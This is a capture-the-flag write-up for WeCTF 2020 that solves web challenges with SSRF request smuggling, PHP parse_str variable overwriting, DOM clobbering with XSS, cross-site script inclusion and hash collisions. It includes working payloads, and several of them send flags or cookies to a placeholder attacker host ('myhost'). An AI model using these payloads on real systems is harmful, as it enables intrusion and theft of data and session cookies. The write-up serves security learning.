# WeCTF 2020
I played with IrisSec, joined a few hours in. Fun intro/intermediate web stuff, around the right level for me, still have lots of holes to fill in my knowledge.

## KVCloud (13 solves)

> Shou hates to use Redis by TCPing it. He instead built a HTTP wrapper for saving his key-value pairs.
> Flag is at /flag.txt.
> Hint: How to keep-alive a connection?
> Note 1: Remote is not using 127.0.0.1 as Redis host.
> Note 2: Try different host if your payload is not working remotely.
> Handout: https://github.com/wectf/2020p/blob/master/kvcloud/handout.zip

The /get route lets us send arbitrary TCP data to a URL, the only restriction is it gets prepended with "GET ". Our goal is to SSRF a post request to the "/debug" endpoint which lets us run arbitrary python, and we can do that with the property that Keep-Alive lets us package requests. The command I used is just the file upload off GTFOBins.

```
/test HTTP/1.1
Host: 127.0.0.1
Connection: Keep-Alive
Content-Length: 1000

POST /debug HTTP/1.1
Host: 127.0.0.1
Connection: Keep-Alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 406

cmd=import%20sys%3B%20from%20os%20import%20environ%20as%20e%0Aif%20sys%2Eversion%5Finfo%2Emajor%20%3D%3D%203%3A%20import%20urllib%2Erequest%20as%20r%2C%20urllib%2Eparse%20as%20u%0Aelse%3A%20import%20urllib%20as%20u%2C%20urllib2%20as%20r%0Ar%2Eurlopen%28%27http%3A%2F%2Fmyhost%27%2C%20bytes%28u%2Eurlencode%28%7B%22d%22%3Aopen%28%27%2Fflag%2Etxt%27%29%2Eread%28%29%7D%29%2Eencode%28%29%29%29
```

Flag: `we{144f8595-9e5c-4ac7-a526-6774f7162b78@mayb3-1cmp-based-33rf-nex7-year?}`

## dont-bf-me (36 solves)
> Shou uses Recaptcha for his site to make it "safer".
> Hint: The password is so long that makes any bruteforcing method impotent.
> Handout: https://github.com/wectf/2020p/blob/master/dont-bf-me/handout.zip

The PHP code uses `parse_str` to deserialize the query string. This function lets us overwrite global variables; we overwrite the recaptcha check with our server and both password and CORRECT_PASSWORD with the same thing.

`http://bfm.ny.ctf.so/login.php?password=&CORRECT_PASSWORD=&RECAPTCHA_URL=https://myhost/test.json?&g-recaptcha-response=a`

test.json: `{"success":true, "score":1.0}`

Flag: `we{f3243131-45e1-4d82-9dfb-586760275ac6@0bvious1y_n0t_a_brutef0rc3_cha11}`

## Hashtable (15 solves)
> Universal hashing could prevent hackers from DoSing the hash table by creating a lot of collisions. Shou doubt that. Prove him correct by DoSing this hash table implemented with universal hashing.
> Note: having 10 collisions at the same slot would give you the flag
> Handout: https://github.com/wectf/2020p/blob/master/hashtable/handout.zip

The page feeds us the random seed so we can recover P1 and P2 as so:
```go
package main

import (
    "math/big"
    "math/rand"
    "os"
    "strconv"
    "fmt"
)


func main () {
    val, err := strconv.Atoi(os.Args[1])
    if err != nil {
        fmt.Printf("Argument is not a number!")
    }
    rand.Seed(int64(val))
    p1 := big.NewInt(int64(rand.Intn(1 << 32)))
    p2 := big.NewInt(int64(rand.Intn(1 << 32)))
    fmt.Printf("p1 %d p2 %d", p1, p2)
}
```

And then we just brute force some collisions, the key space is tiny:
```python
from collections import defaultdict
d = defaultdict(list)

P1 = 2981479847
P2 = 647990579
T = 10000

for i in range(4096,1<<20):
    t = pow(i, P1, P2) % T
    d[t].append(i)
    if len(d[t]) == 10: break

print(d[t])
```

Flag: `we{6890260a-0fed-48a3-9865-91daa1d0df52@l00ks_l1ke_u_got_an_A+_1n_crypt01o1}`

## Notebin (8 solves)
> Here is where Shou keeps his pathetic diaries and a shinny flag.
(No handout)

DOMpurify doesn't block all HTML, just what seems to be XSS. If we use DOM clobbering in the title to enable the debug flag, the content data is passed directly in.

Here was my post data for the note (pre urlencoding components):
`title=<a id="_debug"></a><a id="_debug" name="key" href="sha1:f03e8a370aa8dc80f63a6d67401a692ae72fa530"></a>&content=<img src="a" onerror="fetch("blahblahblah" + btoa(document.cookie))"></img>`

My payload didn't work on the server despite working on latest Chrome so I got the flag from the admin.

Flag: `we{16426109-0fbf-4ec0-a309-843faff84f8a@3asy_cl0bber}`

## Wallet (4 solves)
> Shou has a habit of saving secret (i.e. flag) in the blockchain. Here is where he stores his bitcoin addresses.
> Note: wrap what you find on blockchain with we{.....}
> Hint 1: You should leak the bitcoin address in Shou's wallet first.
> Hint 2: Shou is using Firefox. Firefox does not have CORB.
> Handout: https://github.com/wectf/2020p/blob/master/wallet/handout.zip

We can POST to the server from our pages without trouble. With this and the lack of filtering in the Raw theme along with theme setting, we can make it return valid JS and include `/` as a script which sets some variables. We set the style to `Raw;d="` to make it so what appears after becomes part of a string variable `d`. Then we add an address with name `"`, closing the quotes.

After getting the admin's wallet address, we look at his transactions and find one with a suspicious OP_RETURN. Decoding the data in it gives us our flag.

```html
<!DOCTYPE html>
<html>
<head>
    <title>WeCTF Wallet</title>
</head>
<body>
Hi.
</body>
<script type="text/javascript">
    fetch("http://wallet.ny.ctf.so/style", {method: 'POST', mode: 'no-cors', body: 'style=Raw;d="', credentials: 'include', headers: {'Content-Type': 'application/x-www-form-urlencoded'}}).then(d => d.text()).then(d => console.log(d));
    fetch("http://wallet.ny.ctf.so/address", {method: 'POST', mode: 'no-cors', body: 'address="', credentials: 'include', headers: {'Content-Type': 'application/x-www-form-urlencoded'}}).then(d => d.text()).then(d => console.log(d));
    var a = document.createElement('script');
    window.style = "";
    window.Raw = "test";
    a.src = "http://wallet.ny.ctf.so/";
    document.head.appendChild(a);
    window.setTimeout(() => {
        fetch("http://myhost/?d=" + d);
    }, 1000);

</script>
</html>
```

Flag: `we{8e90d51b-4418-4659-9fb3-cc78a548fe25@0ps}`